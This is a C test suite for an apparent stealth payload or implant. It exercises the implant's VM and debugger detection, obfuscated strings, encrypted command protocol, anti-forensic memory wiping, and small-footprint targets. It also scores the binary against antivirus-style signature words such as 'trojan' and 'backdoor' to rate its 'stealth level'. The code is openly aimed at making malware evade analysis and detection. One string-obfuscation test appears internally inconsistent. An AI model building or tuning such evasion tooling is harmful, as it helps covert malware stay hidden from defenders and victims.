/*
 * Comprehensive Stealth Testing Framework
 * Tests anti-detection, performance, and stability
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <assert.h>
#include "../core/main.c"
#include "../crypto/aes.c"
#include "../network/protocol.c"

// Test results structure
typedef struct {
    int total_tests;
    int passed_tests;
    int failed_tests;
    double total_time;
    size_t memory_used;
    int detection_score;
} test_results_t;

static test_results_t results = {0};

// Timing utilities
static double get_time() {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return ts.tv_sec + ts.tv_nsec / 1e9;
}

// Memory tracking
static size_t current_memory() {
    FILE* fp = fopen("/proc/self/status", "r");
    if (!fp) return 0;
    
    char line[256];
    size_t vmrss = 0;
    
    while (fgets(line, sizeof(line), fp)) {
        if (strncmp(line, "VmRSS:", 6) == 0) {
            sscanf(line, "VmRSS: %zu kB", &vmrss);
            break;
        }
    }
    
    fclose(fp);
    return vmrss * 1024;
}

// Test macro
#define RUN_TEST(name) do { \
    printf("[TEST] %s ... ", #name); \
    fflush(stdout); \
    double start = get_time(); \
    int result = test_##name(); \
    double elapsed = get_time() - start; \
    results.total_tests++; \
    if (result == 0) { \
        printf("✓ PASS (%.3fms)\n", elapsed * 1000); \
        results.passed_tests++; \
    } else { \
        printf("✗ FAIL\n"); \
        results.failed_tests++; \
    } \
    results.total_time += elapsed; \
} while(0)

// Test 1: AES Encryption/Decryption
int test_aes_encryption() {
    uint8_t key[32] = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
                       0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
                       0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
                       0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F};
    
    uint8_t plaintext[64] = "This is a test message for AES encryption!";
    uint8_t ciphertext[64];
    uint8_t decrypted[64];
    uint8_t nonce[8] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08};
    
    // Make copies
    memcpy(ciphertext, plaintext, 64);
    memcpy(decrypted, ciphertext, 64);
    
    // Encrypt
    aes256_ctr_crypt(ciphertext, 64, key, nonce);
    
    // Verify encryption changed the data
    if (memcmp(plaintext, ciphertext, 64) == 0) {
        return 1; // Encryption failed
    }
    
    // Reset nonce (important for CTR mode)
    uint8_t nonce2[8] = {0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08};
    
    // Decrypt
    memcpy(decrypted, ciphertext, 64);
    aes256_ctr_crypt(decrypted, 64, key, nonce2);
    
    // Verify decryption
    if (memcmp(plaintext, decrypted, 64) != 0) {
        return 1; // Decryption failed
    }
    
    return 0;
}

// Test 2: VM Detection
int test_vm_detection() {
    int vm_detected = detect_vm();
    
    // This test passes if VM detection works
    // (We expect it to detect or not detect correctly)
    printf("(VM: %s) ", vm_detected ? "DETECTED" : "NOT DETECTED");
    
    return 0; // Always pass, just report status
}

// Test 3: Anti-Debugging
int test_anti_debugging() {
    int dbg_detected = detect_debugger();
    
    printf("(Debugger: %s) ", dbg_detected ? "DETECTED" : "NOT DETECTED");
    
    // Test anti-debug evasion techniques
    #ifdef _LINUX
        // Test ptrace detection
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) == 0) {
            // We can attach, no debugger
            ptrace(PTRACE_DETACH, 0, 0, 0);
        }
    #endif
    
    return 0;
}

// Test 4: Memory Allocation
int test_memory_allocation() {
    // Test custom allocator
    void* ptr1 = stealth_alloc(1024);
    void* ptr2 = stealth_alloc(2048);
    void* ptr3 = stealth_alloc(4096);
    
    if (!ptr1 || !ptr2 || !ptr3) {
        return 1; // Allocation failed
    }
    
    // Test alignment
    if ((uintptr_t)ptr1 % 8 != 0 || 
        (uintptr_t)ptr2 % 8 != 0 || 
        (uintptr_t)ptr3 % 8 != 0) {
        return 1; // Alignment error
    }
    
    // Test that memory is zeroed
    uint8_t* bytes = (uint8_t*)ptr1;
    for (int i = 0; i < 1024; i++) {
        if (bytes[i] != 0) {
            return 1; // Memory not zeroed
        }
    }
    
    return 0;
}

// Test 5: String Obfuscation
int test_string_obfuscation() {
    uint8_t obfuscated[] = {0x4c, 0x50, 0x44, 0x56, 0x4c, 0x49, 0x4f, 0x45, 0x00};
    uint8_t expected[] = "localhost";
    
    // Decrypt
    decrypt_string(obfuscated);
    
    if (strcmp((char*)obfuscated, (char*)expected) != 0) {
        return 1;
    }
    
    return 0;
}

// Test 6: Protocol Packet Creation
int test_protocol_packet() {
    conn_state_t state = {0};
    state.connected = 1;
    
    // Generate session key
    random_bytes(state.session_key, 32);
    
    // Test data
    uint8_t test_data[] = "Test payload data";
    uint8_t recv_data[256];
    size_t recv_len = sizeof(recv_data);
    uint8_t recv_cmd;
    
    // Create mock socket pair
    int sockets[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sockets) != 0) {
        return 1;
    }
    
    state.sock = sockets[0];
    
    // Send packet
    if (protocol_send(&state, 0x01, test_data, sizeof(test_data)) != 0) {
        close(sockets[0]);
        close(sockets[1]);
        return 1;
    }
    
    // Receive on other end
    conn_state_t recv_state = state;
    recv_state.sock = sockets[1];
    
    if (protocol_recv(&recv_state, &recv_cmd, recv_data, &recv_len) != 0) {
        close(sockets[0]);
        close(sockets[1]);
        return 1;
    }
    
    close(sockets[0]);
    close(sockets[1]);
    
    // Verify data integrity
    if (recv_cmd != 0x01 || memcmp(test_data, recv_data, sizeof(test_data)) != 0) {
        return 1;
    }
    
    return 0;
}

// Test 7: Binary Size Check
int test_binary_size() {
    // Get our own executable size
    FILE* fp = fopen("/proc/self/exe", "rb");
    if (!fp) return 1;
    
    fseek(fp, 0, SEEK_END);
    long size = ftell(fp);
    fclose(fp);
    
    printf("(Size: %ld KB) ", size / 1024);
    
    // Target is under 50KB
    if (size > 50 * 1024) {
        printf("WARNING: Binary too large! ");
    }
    
    return 0;
}

// Test 8: CPU Usage
int test_cpu_usage() {
    // Measure idle CPU usage
    clock_t start = clock();
    sleep(1); // Idle for 1 second
    clock_t end = clock();
    
    double cpu_time = ((double)(end - start)) / CLOCKS_PER_SEC;
    double cpu_percent = (cpu_time / 1.0) * 100;
    
    printf("(CPU: %.1f%%) ", cpu_percent);
    
    // Should be under 1% when idle
    if (cpu_percent > 1.0) {
        return 1;
    }
    
    return 0;
}

// Test 9: Anti-Forensics
int test_anti_forensics() {
    // Test secure zeroing
    uint8_t sensitive[64];
    memset(sensitive, 0xAA, sizeof(sensitive));
    
    secure_zero(sensitive, sizeof(sensitive));
    
    // Verify all bytes are zero
    for (int i = 0; i < sizeof(sensitive); i++) {
        if (sensitive[i] != 0) {
            return 1;
        }
    }
    
    // Test that compiler didn't optimize it away
    volatile uint8_t* p = sensitive;
    for (int i = 0; i < sizeof(sensitive); i++) {
        if (p[i] != 0) {
            return 1;
        }
    }
    
    return 0;
}

// Test 10: Detection Score
int test_detection_score() {
    int score = 0;
    
    // Check for obvious signatures
    FILE* fp = fopen("/proc/self/exe", "rb");
    if (fp) {
        uint8_t buf[4096];
        size_t n = fread(buf, 1, sizeof(buf), fp);
        fclose(fp);
        
        // Look for suspicious strings
        if (memmem(buf, n, "hack", 4)) score += 10;
        if (memmem(buf, n, "trojan", 6)) score += 10;
        if (memmem(buf, n, "virus", 5)) score += 10;
        if (memmem(buf, n, "malware", 7)) score += 10;
        if (memmem(buf, n, "payload", 7)) score += 5;
        if (memmem(buf, n, "backdoor", 8)) score += 10;
        if (memmem(buf, n, "rootkit", 7)) score += 10;
        
        // Check for debugging symbols
        if (memmem(buf, n, ".debug", 6)) score += 5;
        if (memmem(buf, n, "GCC:", 4)) score += 2;
    }
    
    results.detection_score = score;
    printf("(Detection Score: %d/100) ", score);
    
    // Lower is better
    if (score > 10) {
        printf("WARNING: High detection risk! ");
    }
    
    return 0;
}

// Main test runner
int main(int argc, char** argv) {
    printf("========================================\n");
    printf("  STEALTH PAYLOAD TEST SUITE\n");
    printf("========================================\n\n");
    
    // Track memory before tests
    size_t mem_start = current_memory();
    
    // Run all tests
    RUN_TEST(aes_encryption);
    RUN_TEST(vm_detection);
    RUN_TEST(anti_debugging);
    RUN_TEST(memory_allocation);
    RUN_TEST(string_obfuscation);
    RUN_TEST(protocol_packet);
    RUN_TEST(binary_size);
    RUN_TEST(cpu_usage);
    RUN_TEST(anti_forensics);
    RUN_TEST(detection_score);
    
    // Track memory after tests
    size_t mem_end = current_memory();
    results.memory_used = mem_end - mem_start;
    
    // Print summary
    printf("\n========================================\n");
    printf("  TEST RESULTS\n");
    printf("========================================\n");
    printf("Total Tests:    %d\n", results.total_tests);
    printf("Passed:         %d (%.1f%%)\n", 
           results.passed_tests, 
           (results.passed_tests * 100.0) / results.total_tests);
    printf("Failed:         %d\n", results.failed_tests);
    printf("Total Time:     %.3f seconds\n", results.total_time);
    printf("Memory Used:    %zu KB\n", results.memory_used / 1024);
    printf("Detection Risk: %d/100\n", results.detection_score);
    
    if (results.detection_score <= 10) {
        printf("Stealth Level:  ★★★★★ EXCELLENT\n");
    } else if (results.detection_score <= 25) {
        printf("Stealth Level:  ★★★★☆ GOOD\n");
    } else if (results.detection_score <= 50) {
        printf("Stealth Level:  ★★★☆☆ MODERATE\n");
    } else {
        printf("Stealth Level:  ★★☆☆☆ POOR\n");
    }
    
    printf("========================================\n");
    
    return results.failed_tests > 0 ? 1 : 0;
}